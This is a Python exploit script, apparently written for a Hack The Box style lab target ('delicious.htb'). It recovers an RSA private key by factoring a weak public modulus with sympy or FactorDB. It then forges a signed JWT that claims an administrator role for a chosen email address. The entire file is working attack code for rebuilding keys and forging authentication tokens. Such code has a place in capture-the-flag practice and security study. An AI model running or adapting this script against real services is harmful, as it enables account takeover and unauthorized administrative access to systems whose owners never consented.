#!/usr/bin/python3

import argparse
import datetime
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy

def reconstruct_private_key(e, n, use_factor_db):
    # Factorize n into p and q
    factors = factorize(n, use_factor_db)
    p = list(factors.keys())[0]
    q = n // p

    # Compute phi_n
    phi_n = (p - 1) * (q - 1)

    # Compute private exponent d
    d = pow(e, -1, phi_n)

    # Construct the private key
    key = RSA.construct((n, e, d, p, q))
    private_key_bytes = key.export_key()
    private_key_str = private_key_bytes.decode("utf-8")

    # Load the private key
    private_key = serialization.load_pem_private_key(
        private_key_bytes,
        password=None,
        backend=default_backend()
    )

    # Get the public key
    public_key = private_key.public_key()
    public_key_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    public_key_str = public_key_bytes.decode("utf-8")

    return private_key_str, public_key_str


def factorize(n, use_factor_db):
    if use_factor_db:
        from factordb.factordb import FactorDB
        f = FactorDB(n)
        f.connect()
        
        factors = f.get_factor_list() 
        
        # Debug information 
        print(f"Factors from FactorDB: {factors}")

        if len(factors) != 2: 
            raise ValueError(f"Failed to get exactly two prime factors for n from FactorDB. {factors}")
    else:
        import sympy
        factors = sympy.factorint(n)

    return factors


def generate_jwt(n, e, private_key_str):
    import jwt

    # Update the payload as needed here:
    jwk = {
            "kty": "RSA",
            "n": str(n),
            "e": e
        }

    payload = {
        "email": "wind@delicious.htb",
        "role": "administrator",
        "iss": "delicious.htb",
        "jwk": jwk,
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)
    }

    private_key = serialization.load_pem_private_key(
        private_key_str.encode("utf-8"),
        password=None,
        backend=default_backend()
    )

    jwt_token = jwt.encode(
        payload,
        private_key,
        algorithm="RS256"
    )

    return jwt_token


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reconstruct private key from public key")
    parser.add_argument("--n", type=int, help="Modulus n")
    parser.add_argument("--use_factor_db", action="store_true", help="Use FactorDB to factorize n (default: use Sympy)")
    parser.add_argument("--jwt", action="store_true", help="Generate a JWT with the reconstructed private key.")
    parser.add_argument("--e", type=int, default=65537, help="Public exponent e")

    args = parser.parse_args()

    if args.n is None:
        print("Error: Modulus n is required")
        parser.print_help()
        exit(1)

    private_key_str, public_key_str = reconstruct_private_key(args.e, args.n, args.use_factor_db)
    if private_key_str is not None and public_key_str is not None:
        print("Private Key:")
        print(private_key_str)
        print("\nPublic Key:")
        print(public_key_str)

    if args.jwt:
        jwt = generate_jwt(args.n, args.e, private_key_str)
        print("Json Web Token:")
        print(jwt)